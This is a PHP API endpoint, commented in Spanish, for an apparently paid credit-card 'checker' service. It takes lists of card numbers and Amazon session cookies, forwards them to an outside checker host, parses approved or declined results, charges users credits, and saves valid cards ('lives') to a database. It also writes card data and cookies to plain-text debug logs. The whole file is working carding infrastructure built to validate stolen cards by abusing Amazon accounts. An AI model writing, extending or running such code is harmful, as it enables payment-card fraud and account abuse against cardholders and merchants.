<?php
header('Content-Type: application/json');

// Activar reporte de errores para depuración (desactivar en producción)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Log de entrada de la solicitud desde el frontend
file_put_contents(__DIR__ . '/debug_api_input.log', "Request received at " . date('c') . ": " . print_r($_POST, true) . "\n", FILE_APPEND);

// Solo aceptar POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['status' => 'error', 'message' => 'Método no permitido']);
    exit;
}

// Obtener datos del POST con más flexibilidad
$card = $_POST['lista'] ?? $_POST['ccs'] ?? '';
$cookie = $_POST['cookies'] ?? $_POST['cookie'] ?? '';
$pais = $_POST['pais'] ?? 'MX'; // País por defecto

// Validación con mensaje más detallado
if (empty($card) || empty($cookie)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Faltan parámetros requeridos (tarjeta o cookie)',
        'card_received' => !empty($card),
        'cookie_received' => !empty($cookie)
    ]);
    exit;
}

// Verificar acceso del usuario (sistema híbrido: créditos o suscripción)
session_start();
$path = $_SERVER["DOCUMENT_ROOT"];
require_once $path . "/api/v1.1/core/brain.php";
require_once $path . "/api/v1.1/core/hybrid_auth.php";

$user = $_SESSION["user_id"];
if (empty($user)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Sesión de usuario no encontrada'
    ]);
    exit;
}

// Verificar acceso híbrido
$access_info = check_user_access($connection, $user, 2);

if (!$access_info['access']) {
    echo json_encode([
        'status' => 'error',
        'message' => $access_info['reason'],
        'access_type' => $access_info['type'],
        'credits_available' => $access_info['credits'] ?? 0,
        'credits_required' => 2
    ]);
    exit;
}

// Log del intento de acceso
log_access_attempt($user, $access_info, 'amazon');

// Preparar payload para la API externa
$payload = [
    'lista' => $card,
    'cookies' => $cookie,
    'pais' => strtoupper($pais)
];

// Log de depuración: Guardar payload enviado
$debug_data = [
    'timestamp' => date('c'),
    'user_id' => $user,
    'credits_before' => $credits,
    'cookie_length' => strlen($cookie),
    'payload' => $payload
];
file_put_contents(__DIR__ . '/amazon_api_debug.txt',
    "\n=== NUEVA PETICIÓN ===\n" . json_encode($debug_data, JSON_PRETTY_PRINT) . "\n",
    FILE_APPEND
);

// Ejecutar llamada a la API externa
$checker_url = 'https://apis-dpchk.alwaysdata.net/apis/okura/Amazon.php';

file_put_contents(__DIR__ . '/debug_api_curl_request.log', "CURL Request to: " . $checker_url . "\nPayload: " . http_build_query($payload) . "\n", FILE_APPEND);

$ch = curl_init($checker_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$errorCurl = curl_error($ch);
curl_close($ch);

// Log de la respuesta CURL
file_put_contents(__DIR__ . '/debug_api_curl_response.log', "CURL Response at " . date('c') . ":\nHTTP Code: " . $httpCode . "\nError: " . $errorCurl . "\nResponse Body: " . substr($response, 0, 1000) . "\n", FILE_APPEND);

// Validar errores de conexión CURL
if ($response === false || empty($response)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Sin respuesta del checker externo',
        'curl_error' => $errorCurl,
        'http_code' => $httpCode
    ]);
    exit;
}

// Verificar código HTTP
if ($httpCode >= 400) {
    echo json_encode([
        'status' => 'error',
        'message' => "Error HTTP $httpCode del checker externo",
        'http_code' => $httpCode,
        'response_body_preview' => substr($response, 0, 500)
    ]);
    exit;
}

// --- PARSEO DE LA RESPUESTA DEL CHECKER EXTERNO ---
$status = "error";
$message = "Error al procesar la respuesta del checker";
$status1 = "";
$status2 = "";
$removed = "❌ No removido";
$credits_charged = false;

// Verificar si la respuesta es JSON
$is_json = json_decode($response, true);
if ($is_json !== null && json_last_error() === JSON_ERROR_NONE) {
    $status = isset($is_json['status']) ? $is_json['status'] : 'error';
    $message = isset($is_json['message']) ? $is_json['message'] : 'Respuesta JSON no contiene mensaje';
    $status1 = isset($is_json['status1']) ? $is_json['status1'] : $message;
    $status2 = isset($is_json['status2']) ? $is_json['status2'] : $status;
    $removed = isset($is_json['removed']) ? $is_json['removed'] : '❌ No removido';

    if ($status === 'success') {
        $status1 = $status1 ?: "✅ Aprobada";
        $status2 = $status2 ?: "Approved";
        // Deducir créditos solo si es necesario (sistema híbrido)
        $deduction_result = deduct_credits_if_needed($connection, $user, $access_info, 2);
        $credits_charged = $deduction_result['deducted'] > 0;
        
        // Guardar la live exitosa en la base de datos
        try {
            $insert_live = $connection->prepare("INSERT INTO breathe_lives (live, user_id, number_key, created_at) VALUES (?, ?, ?, NOW())");
            $insert_live->execute([$card, $user, 'AMAZON-GATE']);
        } catch (Exception $e) {
            // Log del error pero no interrumpir el flujo
            error_log("Error al guardar live: " . $e->getMessage());
        }
    } elseif ($status === 'error') {
        $status1 = $status1 ?: "❌ Reprobada";
        $status2 = $status2 ?: "Declined";
    }
} else {
    // La respuesta es HTML
    if (preg_match('/<span class="text-(success|danger)">(Aprovada|Reprovada|Erros)<\/span>/', $response, $matches)) {
        $status_class = $matches[1];
        $status_text = $matches[2];

        if ($status_text === "Aprovada") {
            $status = "success";
            $status1 = "✅ Aprobada";
            $status2 = "Approved";
            $message = "✅ Aprobada";
            // Deducir créditos solo si es necesario (sistema híbrido)
            $deduction_result = deduct_credits_if_needed($connection, $user, $access_info, 2);
            $credits_charged = $deduction_result['deducted'] > 0;
            
            // Guardar la live exitosa en la base de datos
            try {
                $insert_live = $connection->prepare("INSERT INTO breathe_lives (live, user_id, number_key, created_at) VALUES (?, ?, ?, NOW())");
                $insert_live->execute([$card, $user, 'AMAZON-GATE']);
            } catch (Exception $e) {
                // Log del error pero no interrumpir el flujo
                error_log("Error al guardar live: " . $e->getMessage());
            }
        } elseif ($status_text === "Reprovada") {
            $status = "error";
            $status1 = "❌ Reprobada";
            $status2 = "Declined";
            $message = "❌ Reprobada";
        } else { // Erros
            $status = "error";
            $status1 = "❌ Error";
            $status2 = "Error";
            $message = "❌ Error: Sessão expirada ou cookies inválidos, faça login novamente en Amazon.";
        }
    }

    // Extraer el mensaje detallado
    if (preg_match('/<span class="text-(success|danger)">(?:Aprovada|Reprovada|Erros)<\/span>.*?<span class="text-(success|danger)">(.*?)<\/span>/', $response, $matches_detail)) {
        $message = trim($matches_detail[3]);
    }

    // Buscar si fue removido
    if (preg_match('/Removido: (✅|❌)/', $response, $matches_removed)) {
        $removed = $matches_removed[1] === "✅" ? "✅ Removido" : "❌ No removido";
    }
}

// Log final del resultado
file_put_contents(__DIR__ . '/amazon_api_debug.txt',
    "=== RESULTADO FINAL ===\n" . json_encode([
        'status' => $status,
        'message' => $message,
        'credits_charged' => $credits_charged,
        'credits_remaining' => $credits_charged ? ($credits - 2) : $credits
    ], JSON_PRETTY_PRINT) . "\n\n",
    FILE_APPEND
);

// Devolver respuesta en formato JSON al frontend
echo json_encode([
    'status' => $status,
    'status1' => $status1,
    'status2' => $status2,
    'message' => $message,
    'removed' => $removed,
    'card' => $card,
    'response' => $message,
    'cookie_info' => [
        'length' => strlen($cookie)
    ],
    'credits_info' => [
        'charged' => $credits_charged,
        'amount_charged' => $credits_charged ? 2 : 0,
        'remaining' => $access_info['credits'],
        'access_type' => $access_info['type'],
        'status_display' => get_user_status_display($access_info)
    ],
    'response_api' => [
        'status' => $status,
        'status1' => $status1,
        'status2' => $status2,
        'message' => $message,
        'removed' => $removed,
        'card' => $card
    ]
]);
?>